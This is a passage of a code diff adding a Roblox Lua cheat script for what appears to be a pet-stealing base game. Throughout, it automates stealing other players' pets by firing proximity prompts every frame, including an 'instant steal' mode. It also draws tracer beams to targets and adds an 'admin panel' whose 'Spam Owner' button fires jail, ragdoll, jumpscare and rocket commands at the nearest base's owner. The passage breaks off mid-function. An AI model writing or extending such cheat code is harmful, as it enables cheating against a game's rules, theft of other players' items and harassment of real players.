+            TweenService:Create(glowStroke, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Transparency = 0
+            }):Play()
+            TweenService:Create(innerGlow, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                BackgroundTransparency = 0.85
+            }):Play()
+            
+            task.delay(0.4, function()
+                TweenService:Create(glowStroke, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Transparency = 0.6
+                }):Play()
+                TweenService:Create(innerGlow, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    BackgroundTransparency = 1
+                }):Play()
+            end)
+            
+            sound.Ended:Connect(function() sound:Destroy() end)
+        end
+        
+        task.delay(4, function()
+            TweenService:Create(alertFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                Position = UDim2.new(0.5, 0, 0, -70)
+            }):Play()
+            task.wait(0.35)
+            alertGui:Destroy()
+        end)
+    end
+    
+    
+    task.spawn(function()
+        task.wait(0.5)  
+        while true do
+            task.wait(0.5)  
+            if not hasShownPriorityAlert and Config.AlertsEnabled and #allAnimalsCache > 0 then
+                
+                local foundPriorityPet = nil
+                for i = 1, #PRIORITY_LIST do
+                    local priorityName = PRIORITY_LIST[i]
+                    local searchName = priorityName:lower()
+                    
+                    
+                    for _, pet in ipairs(allAnimalsCache) do
+                        if pet.name and pet.name:lower() == searchName then
+                            foundPriorityPet = pet
+                            break
+                        end
+                    end
+                    
+                    
+                    if foundPriorityPet then
+                        break
+                    end
+                end
+                
+                if foundPriorityPet then
+                    
+                    local ownerUsername = foundPriorityPet.owner
+                    local ownerPlayer = nil
+                    
+                    local plot = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(foundPriorityPet.plot)
+                    if plot then
+                        
+                        local sync = Synchronizer
+                        if not sync then
+                            local Packages = ReplicatedStorage:FindFirstChild("Packages")
+                            if Packages then
+                                local ok, syncModule = pcall(function() return require(Packages:WaitForChild("Synchronizer")) end)
+                                if ok then sync = syncModule end
+                            end
+                        end
+                        
+                        if sync then
+                            local ok, ch = pcall(function() return sync:Get(plot.Name) end)
+                            if ok and ch then
+                                local owner = ch:Get("Owner")
+                                if owner then
+                                    if typeof(owner) == "Instance" and owner:IsA("Player") then
+                                        ownerPlayer = owner
+                                        ownerUsername = owner.Name
+                                    elseif type(owner) == "table" and owner.Name then
+                                        ownerUsername = owner.Name
+                                        ownerPlayer = Players:FindFirstChild(owner.Name)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    
+                    
+                    if not ownerPlayer and ownerUsername then
+                        ownerPlayer = Players:FindFirstChild(ownerUsername)
+                    end
+                    
+                    ShowPriorityAlert(foundPriorityPet.name, foundPriorityPet.genText, foundPriorityPet.mutation, ownerUsername)
+                end
+            end
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            task.wait(0.5)
+            autoStealEnabled = true
+            if autoStealEnabled then
+                local pets = get_all_pets()
+                if #pets > 0 then
+                    local function applySelection(newIndex)
+                        if newIndex and newIndex >= 1 and newIndex <= #pets and selectedTargetIndex ~= newIndex then
+                            selectedTargetIndex = newIndex
+                            selectedTargetUID = pets[newIndex].uid
+                            SharedState.ListNeedsRedraw = false
+                            updateUI(autoStealEnabled, pets)
+                        end
+                    end
+
+                    local manualFound = false
+                    if State.manualTargetEnabled and selectedTargetUID then
+                        for i, p in ipairs(pets) do
+                            if p.uid == selectedTargetUID then
+                                if selectedTargetIndex ~= i then
+                                    selectedTargetIndex = i
+                                    updateUI(autoStealEnabled, pets)
+                                end
+                                manualFound = true
+                                break
+                            end
+                        end
+                    end
+
+                    if manualFound then
+                        -- Manual selection takes priority as long as pet exists
+                    elseif stealPriorityEnabled then
+                        local foundPrioIndex = nil
+                        for _, pName in ipairs(PRIORITY_LIST) do
+                            local searchName = pName:lower()
+                            for i, p in ipairs(pets) do
+                                if p.petName and p.petName:lower() == searchName then
+                                    foundPrioIndex = i
+                                    break
+                                end
+                            end
+                            if foundPrioIndex then break end
+                        end
+                        if foundPrioIndex then
+                            applySelection(foundPrioIndex)
+                        else
+                            applySelection(1)
+                        end
+                    elseif stealNearestEnabled then
+                        local char = LocalPlayer.Character
+                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            local bestIndex = nil
+                            local bestDist = math.huge
+                            for i, p in ipairs(pets) do
+                                local targetPart = p.animalData and findAdorneeGlobal(p.animalData)
+                                if targetPart and targetPart:IsA("BasePart") then
+                                    local d = (hrp.Position - targetPart.Position).Magnitude
+                                    if d < bestDist then
+                                        bestDist = d
+                                        bestIndex = i
+                                    end
+                                end
+                            end
+                            if bestIndex then
+                                applySelection(bestIndex)
+                            else
+                                applySelection(1)
+                            end
+                        else
+                            applySelection(1)
+                        end
+                    elseif stealHighestEnabled then
+                        applySelection(1)
+                    else
+                        State.manualTargetEnabled = false
+                    end
+                end
+            end
+        end
+    end)
+
+    RunService.Heartbeat:Connect(function()
+        if not autoStealEnabled then
+            autoStealEnabled = true
+        end
+        if instantStealEnabled then
+            if activeProgressTween then activeProgressTween:Cancel() activeProgressTween = nil end
+            setProgressVisualFull()
+            if not instantStealDidInit then
+                instantStealDidInit = true
+                task.spawn(function()
+                    if not game:IsLoaded() then game.Loaded:Wait() end
+                    task.wait(0.5)
+                    instantStealReady = true
+                end)
+            end
+            if instantStealReady then
+                if stealNearestEnabled then
+                    local prompt, dist, name = findNearestPrompt_Instant()
+                    if prompt and dist <= INSTANT_STEAL_RADIUS then
+                        executeInstantSteal(prompt)
+                    end
+                else
+                    local pets = get_all_pets()
+                    if #pets > 0 then
+                        if selectedTargetIndex > #pets then selectedTargetIndex = #pets end
+                        if selectedTargetIndex < 1 then selectedTargetIndex = 1 end
+                        local tp = pets[selectedTargetIndex]
+                        if tp and not isMyBaseAnimal(tp.animalData) then
+                            local pr = PromptMemoryCache[tp.uid]
+                            if not pr or not pr.Parent then
+                                pr = findProximityPromptForAnimal(tp.animalData)
+                            end
+                            if pr then
+                                executeInstantSteal(pr)
+                            end
+                        end
+                    end
+                end
+            end
+            return
+        end
+        local pets = get_all_pets()
+        if #pets == 0 then return end
+        if selectedTargetIndex > #pets then selectedTargetIndex = #pets end
+        if selectedTargetIndex < 1 then selectedTargetIndex = 1 end
+        local tp = pets[selectedTargetIndex]
+        if not tp or isMyBaseAnimal(tp.animalData) then return end
+        local pr = PromptMemoryCache[tp.uid]
+        if not pr or not pr.Parent then
+            pr = findProximityPromptForAnimal(tp.animalData)
+        end
+        if pr then
+            attemptSteal(pr, tp.uid)
+        end
+    end)
+
+    task.spawn(function() while task.wait(0.5) do updateUI(autoStealEnabled, get_all_pets()) end end)
+    task.delay(1, function() SharedState.ListNeedsRedraw=true; updateUI(autoStealEnabled, get_all_pets()) end)
+    task.spawn(function() while true do SharedState.AllAnimalsCache=allAnimalsCache; task.wait(0.5) end end)
+
+    local beamFolder = Instance.new("Folder", Workspace)
+    beamFolder.Name = "BullysTracers"
+    local currentBeam = nil
+    local currentAtt0 = nil
+    local currentAtt1 = nil
+
+    local function updateTracer()
+        if not autoStealEnabled or not Config.TracerEnabled then
+            if currentBeam then currentBeam:Destroy() currentBeam=nil end
+            if currentAtt0 then currentAtt0:Destroy() currentAtt0=nil end
+            if currentAtt1 then currentAtt1:Destroy() currentAtt1=nil end
+            return
+        end
+
+        local best = nil
+        local targetPart = nil
+        if Config.LineToBase then
+            local char = LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local plots = Workspace:FindFirstChild("Plots")
+                if plots then
+                    for _, plot in ipairs(plots:GetChildren()) do
+                        local ok, ch = pcall(function() return Synchronizer:Get(plot.Name) end)
+                        if ok and ch then
+                            local owner = ch:Get("Owner")
+                            local ownerId = (typeof(owner) == "Instance" and owner:IsA("Player")) and owner.UserId or (type(owner) == "table" and owner.UserId)
+                            if ownerId == LocalPlayer.UserId then
+                                local plotPos = plot:FindFirstChild("Base") and plot.Base:FindFirstChild("Spawn")
+                                if plotPos and plotPos:IsA("BasePart") then
+                                    targetPart = plotPos
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            local pets = get_all_pets()
+            if #pets == 0 then
+                if currentBeam then currentBeam.Enabled=false end
+                return
+            end
+            if selectedTargetIndex > #pets then selectedTargetIndex = #pets end
+            if selectedTargetIndex < 1 then selectedTargetIndex = 1 end
+            best = pets[selectedTargetIndex] or pets[1]
+            targetPart = findAdorneeGlobal(best.animalData)
+        end
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+        if hrp and targetPart then
+            if not currentAtt0 or currentAtt0.Parent ~= hrp then
+                if currentAtt0 then currentAtt0:Destroy() end
+                currentAtt0 = Instance.new("Attachment", hrp)
+            end
+            if not currentAtt1 or currentAtt1.Parent ~= targetPart then
+                if currentAtt1 then currentAtt1:Destroy() end
+                currentAtt1 = Instance.new("Attachment", targetPart)
+            end
+
+            if not currentBeam then
+                currentBeam = Instance.new("Beam", beamFolder)
+                currentBeam.FaceCamera = true
+                currentBeam.Width0 = 0.8
+                currentBeam.Width1 = 0.8
+                currentBeam.TextureMode = Enum.TextureMode.Static
+                currentBeam.TextureSpeed = 3
+            end
+
+            currentBeam.Attachment0 = currentAtt0
+            currentBeam.Attachment1 = currentAtt1
+            currentBeam.Enabled = true
+
+            local col = Color3.fromRGB(170,170,170)
+            currentBeam.Color = ColorSequence.new(col)
+        else
+            if currentBeam then currentBeam.Enabled = false end
+        end
+    end
+
+    RunService.Heartbeat:Connect(updateTracer)
+end)
+
+task.spawn(function()
+    local COOLDOWNS = {
+        rocket = 120, ragdoll = 30, balloon = 30, inverse = 60,
+        nightvision = 60, jail = 60, tiny = 60, jumpscare = 60, morph = 60
+    }
+    local ALL_COMMANDS = {
+        "balloon", "inverse", "jail", "jumpscare", "morph", 
+        "nightvision", "ragdoll", "rocket", "tiny"
+    }
+
+    local activeCooldowns = {} 
+    SharedState.AdminButtonCache = {}
+
+    BlacklistedPlayers = Config.Blacklist or {}
+
+    addToBlacklist = function(username)
+        if not username or username == "" then return false end
+        local lower = string.lower(username)
+        for _, v in ipairs(BlacklistedPlayers) do
+            if string.lower(v) == lower then return false end
+        end
+        table.insert(BlacklistedPlayers, username)
+        Config.Blacklist = BlacklistedPlayers
+        SaveConfig()
+        return true
+    end
+
+    removeFromBlacklist = function(username)
+        if not username or username == "" then return false end
+        local lower = string.lower(username)
+        for i, v in ipairs(BlacklistedPlayers) do
+            if string.lower(v) == lower then
+                table.remove(BlacklistedPlayers, i)
+                Config.Blacklist = BlacklistedPlayers
+                SaveConfig()
+                if _G.removeBlacklistESP then
+                    local p = Players:FindFirstChild(username)
+                    if p then _G.removeBlacklistESP(p) end
+                end
+                return true
+            end
+        end
+        return false
+    end
+
+    isBlacklisted = function(username)
+        if not username then return false end
+        local lower = string.lower(tostring(username))
+        for _, v in ipairs(BlacklistedPlayers) do
+            if string.lower(tostring(v)) == lower then return true end
+        end
+        return false
+    end
+
+    canUseAdminAction = function(targetPlayer)
+        if not targetPlayer then return false end
+        if isBlacklisted(targetPlayer.Name) then
+            ShowNotification("BLACKLIST", targetPlayer.Name .. " is blacklisted")
+            return false
+        end
+        return true
+    end
+
+    refreshBlacklistUI = nil
+
+    local function adminGetSync()
+        local ok, m = pcall(function()
+            return require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+        end)
+        return ok and m or nil
+    end
+
+    local adminGui = Instance.new("ScreenGui")
+    adminGui.Name = "XiAdminPanel"
+    adminGui.ResetOnSpawn = false
+    adminGui.Parent = PlayerGui
+
+    local frame = Instance.new("Frame")
+    local mobileScale = IS_MOBILE and 0.65 or 1
+    frame.Size = UDim2.new(0, 440 * mobileScale, 0, 620 * mobileScale)
+    frame.Position = UDim2.new(Config.Positions.AdminPanel.X, 0, Config.Positions.AdminPanel.Y, 0)
+    frame.BackgroundColor3 = Theme.Background
+    frame.BackgroundTransparency = 0.05
+    frame.BorderSizePixel = 0
+    frame.Parent = adminGui
+    
+    -- Forward-declare so closures (refresh, createPlayerRow, sortAdminPanelList) capture the right upvalue
+    local listFrame
+    local layout
+    local blFrame
+
+    ApplyViewportUIScaleAdmin(frame, 400, 450, 0.45, 0.85)
+    AddMobileMinimizeAdmin(frame, "ADMIN")
+    
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Theme.Accent2; stroke.Thickness = 1.5; stroke.Transparency = 0.4
+    CreateGradient(stroke)
+    task.defer(function() if addRacetrackBorder then addRacetrackBorder(frame, 3.5) end end)
+
+    local header = Instance.new("Frame", frame)
+    header.Size = UDim2.new(1, 0, 0, 40)
+    header.BackgroundTransparency = 1
+    MakeDraggable(header, frame, "AdminPanel")
+
+    local title = Instance.new("TextLabel", header)
+    title.Size = UDim2.new(1, -100, 1, 0)
+    title.Position = UDim2.new(0, 15, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "admin panel"
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 16
+    title.TextColor3 = Theme.TextPrimary
+    title.TextXAlignment = Enum.TextXAlignment.Left
+
+    local refreshBtn = Instance.new("TextButton", header)
+    refreshBtn.Size = UDim2.new(0, 80, 0, 30)
+    refreshBtn.Position = UDim2.new(1, -85, 0.5, -15)
+    refreshBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    refreshBtn.Text = "REFRESH"
+    refreshBtn.Font = Enum.Font.GothamBold
+    refreshBtn.TextSize = 12
+    refreshBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 6)
+    local refreshStroke = Instance.new("UIStroke", refreshBtn)
+    refreshStroke.Color = Theme.Accent2
+    refreshStroke.Thickness = 1
+    refreshStroke.Transparency = 0.3
+
+    local proxCont = Instance.new("Frame", frame)
+    proxCont.Size = UDim2.new(1, -20, 0, 44)
+    proxCont.Position = UDim2.new(0, 10, 0, 58)
+    proxCont.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+    proxCont.BackgroundTransparency = 0.3
+    Instance.new("UICorner", proxCont).CornerRadius = UDim.new(0, 10)
+    local proxContStroke = Instance.new("UIStroke", proxCont)
+    proxContStroke.Color = Theme.Accent2
+    proxContStroke.Thickness = 1
+    proxContStroke.Transparency = 0.6
+
+    local proxBtn = Instance.new("TextButton", proxCont)
+    proxBtn.Name = "ProximityAPButton"
+    proxBtn.Size = UDim2.new(0, 70, 0, 26)
+    proxBtn.Position = UDim2.new(0, 6, 0.5, -13)
+    proxBtn.BackgroundColor3 = ProximityAPActive and Theme.Accent1 or Color3.fromRGB(35, 37, 43)
+    proxBtn.Text = "Prox"
+    proxBtn.Font = Enum.Font.GothamBold; proxBtn.TextSize = 11
+    proxBtn.TextColor3 = ProximityAPActive and Color3.new(255,255,255) or Theme.TextPrimary
+    Instance.new("UICorner", proxBtn).CornerRadius = UDim.new(0, 6)
+    local proxBtnStroke = Instance.new("UIStroke", proxBtn)
+    proxBtnStroke.Color = ProximityAPActive and Theme.Accent2 or Color3.fromRGB(50, 52, 58)
+    proxBtnStroke.Transparency = 0.3
+    SharedState.ProximityAPButton = proxBtn
+    SharedState.ProximityAPButtonStroke = proxBtnStroke
+    SharedState.AdminProxBtn = proxBtn
+
+    local spamBaseBtn = Instance.new("TextButton", proxCont)
+    spamBaseBtn.Size = UDim2.new(0, 70, 0, 26)
+    spamBaseBtn.Position = UDim2.new(0, 80, 0.5, -13)
+    spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)
+    spamBaseBtn.Text = "Spam Owner"
+    spamBaseBtn.Font = Enum.Font.GothamBold; spamBaseBtn.TextSize = 9
+    spamBaseBtn.TextColor3 = Theme.TextPrimary
+    Instance.new("UICorner", spamBaseBtn).CornerRadius = UDim.new(0, 6)
+    local spamBaseBtnStroke = Instance.new("UIStroke", spamBaseBtn)
+    spamBaseBtnStroke.Color = Color3.fromRGB(50, 52, 58)
+    spamBaseBtnStroke.Transparency = 0.3
+
+    -- Click-to-AP button in the admin panel bar (auto-enables SingleCommand mode)
+    local ctapPanelBtn = Instance.new("TextButton", proxCont)
+    ctapPanelBtn.Size = UDim2.new(0, 60, 0, 26)
+    ctapPanelBtn.Position = UDim2.new(0, 154, 0.5, -13)
+    ctapPanelBtn.AutoButtonColor = false
+    ctapPanelBtn.Text = "Click AP"
+    ctapPanelBtn.Font = Enum.Font.GothamBold
+    ctapPanelBtn.TextSize = 9
+    ctapPanelBtn.BorderSizePixel = 0
+    local function updateCtapPanelBtn()
+        ctapPanelBtn.BackgroundColor3 = Config.ClickToAP and Theme.Accent1 or Color3.fromRGB(35, 37, 43)
+        ctapPanelBtn.TextColor3 = Config.ClickToAP and Color3.new(0,0,0) or Theme.TextPrimary
+    end
+    updateCtapPanelBtn()
+    Instance.new("UICorner", ctapPanelBtn).CornerRadius = UDim.new(0, 6)
+    local ctapPanelStroke = Instance.new("UIStroke", ctapPanelBtn)
+    ctapPanelStroke.Color = Color3.fromRGB(50, 52, 58)
+    ctapPanelStroke.Transparency = 0.3
+    ctapPanelBtn.MouseButton1Click:Connect(function()
+        Config.ClickToAP = not Config.ClickToAP
+        -- When enabling from the panel, always force single-command mode
+        if Config.ClickToAP then
+            Config.ClickToAPSingleCommand = true
+        end
+        SaveConfig()
+        updateCtapPanelBtn()
+        ShowNotification("CLICK TO AP", Config.ClickToAP and "ON (single cmd)" or "DISABLED")
+    end)
+    
+    spamBaseBtn.MouseButton1Click:Connect(function()
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if not hrp then
+            ShowNotification("SPAM OWNER", "No character found")
+            return
+        end
+        
+        local nearestPlot = nil
+        local nearestDist = math.huge
+        local Plots = Workspace:FindFirstChild("Plots")
+        if Plots then
+            for _, plot in ipairs(Plots:GetChildren()) do
+                local sign = plot:FindFirstChild("PlotSign")
+                if sign then
+                    local yourBase = sign:FindFirstChild("YourBase")
+                    if not yourBase or not yourBase.Enabled then
+                        local signPos = sign:IsA("BasePart") and sign.Position or (sign.PrimaryPart and sign.PrimaryPart.Position)
+                        if not signPos then
+                            local part = sign:FindFirstChildWhichIsA("BasePart", true)
+                            signPos = part and part.Position
+                        end
+                        if signPos then
+                            local dist = (hrp.Position - signPos).Magnitude
+                            if dist < nearestDist then
+                                nearestDist = dist
+                                nearestPlot = plot
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        
+        if not nearestPlot then
+            ShowNotification("SPAM OWNER", "No nearby base found")
+            return
+        end
+        
+        
+        local targetPlayer = nil
+        local ok, ch = pcall(function() local S = adminGetSync(); return S and S:Get(nearestPlot.Name) end)
+        if ok and ch then
+            local owner = ch:Get("Owner")
+            if owner then
+                if typeof(owner) == "Instance" and owner:IsA("Player") then
+                    targetPlayer = owner
+                elseif type(owner) == "table" and owner.Name then
+                    targetPlayer = Players:FindFirstChild(owner.Name)
+                end
+            end
+        end
+        
+        
+        if not targetPlayer then
+            local sign = nearestPlot:FindFirstChild("PlotSign")
+            local textLabel = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") and sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+            if textLabel then
+                local baseText = textLabel.Text
+                local nickname = baseText and baseText:match("^(.-)'") or baseText
+                if nickname then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        if p.DisplayName == nickname or p.Name == nickname then
+                            targetPlayer = p
+                            break
+                        end
+                    end
+                end
+            end
+        end
+        
+        if not targetPlayer or targetPlayer == LocalPlayer then
+            ShowNotification("SPAM OWNER", "Owner not found or is you")
+            return
+        end
+        
+        spamBaseBtn.BackgroundColor3 = Theme.Accent1
+        spamBaseBtn.TextColor3 = Color3.new(1,1,1)
+        ShowNotification("SPAM OWNER", "Spamming " .. targetPlayer.DisplayName)
+        
+        task.spawn(function()
+            local cmds = {"balloon", "inverse", "jail", "jumpscare", "morph", "nightvision", "ragdoll", "rocket", "tiny"}
+            local cmdCount = 0
+            
+            local adminFunc = _G.runAdminCommand
+            if not adminFunc then
+                task.wait(0.05)
+                adminFunc = _G.runAdminCommand
+            end
+            
+            if not adminFunc then
+                spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)
+                spamBaseBtn.TextColor3 = Theme.TextPrimary
+                ShowNotification("SPAM OWNER", "Admin command not ready")
+                return
+            end
+            
+            for _, cmd in ipairs(cmds) do
+                local success, result = pcall(function()
+                    return adminFunc(targetPlayer, cmd)
+                end)
+                if success and result then
+                    cmdCount = cmdCount + 1
+                end
+                task.wait(0.15)
+            end
+            
+            task.wait(0.2)
+            spamBaseBtn.BackgroundColor3 = Color3.fromRGB(35, 37, 43)
+            spamBaseBtn.TextColor3 = Theme.TextPrimary
+            ShowNotification("SPAM OWNER", "Sent " .. cmdCount .. " commands to " .. targetPlayer.DisplayName)
+        end)
+    end)
+
+    local proxSliderBg = Instance.new("Frame", proxCont)
+    proxSliderBg.Size = UDim2.new(0, 140, 0, 5)
+    proxSliderBg.Position = UDim2.new(0, 105, 0.5, -2.5)
+    proxSliderBg.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
+    Instance.new("UICorner", proxSliderBg).CornerRadius = UDim.new(1,0)
+    local proxFill = Instance.new("Frame", proxSliderBg)
+    proxFill.BackgroundColor3 = Theme.Accent1; proxFill.Size = UDim2.new(0,0,1,0)
+    Instance.new("UICorner", proxFill).CornerRadius = UDim.new(1,0)
+    local proxKnob = Instance.new("Frame", proxSliderBg)
+    proxKnob.Size = UDim2.new(0,12,0,12); proxKnob.BackgroundColor3 = Theme.TextPrimary
+    proxKnob.AnchorPoint = Vector2.new(0.5, 0.5); proxKnob.Position = UDim2.new(0,0,0.5,0)
+    Instance.new("UICorner", proxKnob).CornerRadius = UDim.new(1,0)
+    local proxKnobStroke = Instance.new("UIStroke", proxKnob)
+    proxKnobStroke.Color = Theme.Accent1
+    proxKnobStroke.Thickness = 1.5
+    proxKnobStroke.Transparency = 0.2
+    local function updateProxSlider(val)
+        local min, max = 5, 50
+        val = math.clamp(val, min, max)
+        Config.ProximityRange = val; SaveConfig()
+        local pct = (val - min)/(max - min)
+        proxFill.Size = UDim2.new(pct, 0, 1, 0)
+        proxKnob.Position = UDim2.new(pct, 0, 0.5, 0)
+        ShowNotification("PROXIMITY RANGE", string.format("%.1f", val) .. " studs")
+    end
+    updateProxSlider(Config.ProximityRange)
+
+    local pDragging = false
+    proxSliderBg.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDragging=true end end)
+    UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDragging=false end end)
+    UserInputService.InputChanged:Connect(function(i)
+        if pDragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local x = i.Position.X
+            local r = proxSliderBg.AbsolutePosition.X
+            local w = proxSliderBg.AbsoluteSize.X
+            local p = (x - r) / w
+            updateProxSlider(5 + (p * 45))
+        end
+    end)
+
+    local proxViz = nil
+    local function updateProxViz()
+        if ProximityAPActive then 
+            if not proxViz then
+                proxViz = Instance.new("Part")
+                proxViz.Name = "XiProxViz"
+                proxViz.Anchored = true; proxViz.CanCollide = false
+                proxViz.Shape = Enum.PartType.Cylinder
+                proxViz.Color = Theme.Accent1; proxViz.Transparency = 0.6
+                proxViz.CastShadow = false
+                proxViz.Parent = Workspace
+            end
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                local hrp = char.HumanoidRootPart
+                proxViz.Size = Vector3.new(0.5, Config.ProximityRange * 2, Config.ProximityRange * 2)
+                proxViz.CFrame = hrp.CFrame * CFrame.Angles(0,0,math.rad(90)) + Vector3.new(0, -2.5, 0)
+            end
+        else
+            if proxViz then proxViz:Destroy(); proxViz = nil end
+        end
+    end
+    RunService.Heartbeat:Connect(updateProxViz)
+
+    local function updateProximityAPButton()
+        if SharedState.ProximityAPButton then
+            SharedState.ProximityAPButton.BackgroundColor3 = ProximityAPActive and Theme.Accent1 or Color3.fromRGB(35, 37, 43)
+            SharedState.ProximityAPButton.TextColor3 = ProximityAPActive and Color3.new(255,255,255) or Theme.TextPrimary
+            if SharedState.ProximityAPButtonStroke then
+                SharedState.ProximityAPButtonStroke.Color = ProximityAPActive and Theme.Accent2 or Color3.fromRGB(50, 52, 58)
+            end
+        end
+    end
+    
+    proxBtn.MouseButton1Click:Connect(function()
+        ProximityAPActive = not ProximityAPActive 
+        updateProximityAPButton()
+        ShowNotification("PROXIMITY AP", ProximityAPActive and "ENABLED" or "DISABLED")
+    end)
+
+    proxSliderBg.Position = UDim2.new(0, 220, 0.5, -2.5)
+
+    -- â”€â”€ Tab bar: PLAYERS / BLACKLIST â”€â”€
+    local tabBar = Instance.new("Frame", frame)
+    tabBar.Size = UDim2.new(1, -20, 0, 28)
+    tabBar.Position = UDim2.new(0, 10, 0, 108)
+    tabBar.BackgroundTransparency = 1
+    tabBar.BorderSizePixel = 0
+
+    local tabBarLayout = Instance.new("UIListLayout", tabBar)
+    tabBarLayout.FillDirection = Enum.FillDirection.Horizontal
+    tabBarLayout.Padding = UDim.new(0, 4)
+    tabBarLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    tabBarLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+
+    local function makeTabBtn(parent, label, order)
+        local btn = Instance.new("TextButton", parent)
+        btn.LayoutOrder = order
+    btn.Size = UDim2.new(0, 110, 0, 24)
+        btn.AutoButtonColor = false
+        btn.Text = label
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 11
+        btn.BorderSizePixel = 0
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        local s = Instance.new("UIStroke", btn)
+        s.Thickness = 1
+        s.Transparency = 0.4
+        return btn, s
+    end
+
+    local tabPlayers, tabPlayersStroke = makeTabBtn(tabBar, "PLAYERS", 1)
+    local tabBlacklist, tabBlacklistStroke = makeTabBtn(tabBar, "BLACKLIST", 2)
+
+    local activeTab = "players"
+    local function setActiveTab(name)
+        activeTab = name
+        if name == "players" then
+            tabPlayers.BackgroundColor3 = Theme.Accent1
+            tabPlayers.TextColor3 = Color3.new(0,0,0)
+            tabPlayersStroke.Color = Theme.Accent1
+            tabBlacklist.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+            tabBlacklist.TextColor3 = Theme.TextPrimary
+            tabBlacklistStroke.Color = Color3.fromRGB(60, 60, 72)
+            listFrame.Visible = true
+            blFrame.Visible = false
+        else
+            tabBlacklist.BackgroundColor3 = Color3.fromRGB(160, 40, 40)
+            tabBlacklist.TextColor3 = Color3.fromRGB(255, 210, 210)
+            tabBlacklistStroke.Color = Color3.fromRGB(180, 50, 50)
+            tabPlayers.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
+            tabPlayers.TextColor3 = Theme.TextPrimary
+            tabPlayersStroke.Color = Color3.fromRGB(60, 60, 72)
+            listFrame.Visible = false
+            blFrame.Visible = true
+        end
+    end
+
+    tabPlayers.MouseButton1Click:Connect(function() setActiveTab("players") end)
+    tabBlacklist.MouseButton1Click:Connect(function() setActiveTab("blacklist") end)
+
+    -- â”€â”€ Blacklist tab frame â”€â”€
+    blFrame = Instance.new("Frame", frame)
+    blFrame.Size = UDim2.new(1, -20, 1, -144)
+    blFrame.Position = UDim2.new(0, 10, 0, 142)
+    blFrame.BackgroundTransparency = 1
+    blFrame.BorderSizePixel = 0
+    blFrame.ZIndex = 5
+    blFrame.Active = true
+    blFrame.Visible = false
+
+    -- Input row
+    local blInput = Instance.new("TextBox", blFrame)
+    blInput.Size = UDim2.new(1, -58, 0, 26)
+    blInput.Position = UDim2.new(0, 0, 0, 0)
+    blInput.ZIndex = 6
+    blInput.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
+    blInput.BorderSizePixel = 0
+    blInput.Text = ""
+    blInput.PlaceholderText = "Roblox username..."
+    blInput.Font = Enum.Font.Gotham
+    blInput.TextSize = 11
+    blInput.TextColor3 = Theme.TextPrimary
+    blInput.PlaceholderColor3 = Color3.fromRGB(80, 80, 95)
+    blInput.ClearTextOnFocus = false
+    Instance.new("UICorner", blInput).CornerRadius = UDim.new(0, 6)
+    local blInputStroke = Instance.new("UIStroke", blInput)
+    blInputStroke.Color = Color3.fromRGB(55, 55, 65)
+    blInputStroke.Thickness = 1
+    blInputStroke.Transparency = 0.3
+    local blInputPad = Instance.new("UIPadding", blInput)
+    blInputPad.PaddingLeft = UDim.new(0, 8)
+
+    local blAddBtn = Instance.new("TextButton", blFrame)
+    blAddBtn.Size = UDim2.new(0, 50, 0, 26)
+    blAddBtn.Position = UDim2.new(1, -50, 0, 0)
+    blAddBtn.ZIndex = 6
+    blAddBtn.BackgroundColor3 = Color3.fromRGB(140, 35, 35)
+    blAddBtn.Text = "ADD"
+    blAddBtn.Font = Enum.Font.GothamBold
+    blAddBtn.TextSize = 11
+    blAddBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
+    blAddBtn.AutoButtonColor = false
+    Instance.new("UICorner", blAddBtn).CornerRadius = UDim.new(0, 6)
+    local blAddStroke = Instance.new("UIStroke", blAddBtn)
+    blAddStroke.Color = Color3.fromRGB(180, 50, 50)
+    blAddStroke.Thickness = 1
+    blAddStroke.Transparency = 0.4
+
+    -- Scrollable list of blacklisted users
+    local blListScroll = Instance.new("ScrollingFrame", blFrame)
